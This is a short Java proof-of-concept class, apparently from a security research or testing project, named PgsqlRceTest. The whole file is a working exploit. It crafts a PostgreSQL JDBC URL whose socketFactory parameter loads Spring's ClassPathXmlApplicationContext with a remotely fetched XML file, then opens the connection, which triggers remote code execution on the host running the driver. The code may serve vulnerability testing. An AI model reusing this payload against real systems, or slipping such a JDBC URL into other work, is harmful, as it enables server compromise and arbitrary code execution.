package me.n1ar4.pgsql;

import java.sql.DriverManager;
import java.sql.SQLException;

public class PgsqlRceTest {
    public static void main(String[] args) throws SQLException {
        String jdbcUrl = "jdbc:postgresql://127.0.0.1:56343/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:56343/YqBOqYLS.xml";
        DriverManager.getConnection(jdbcUrl);
    }
}
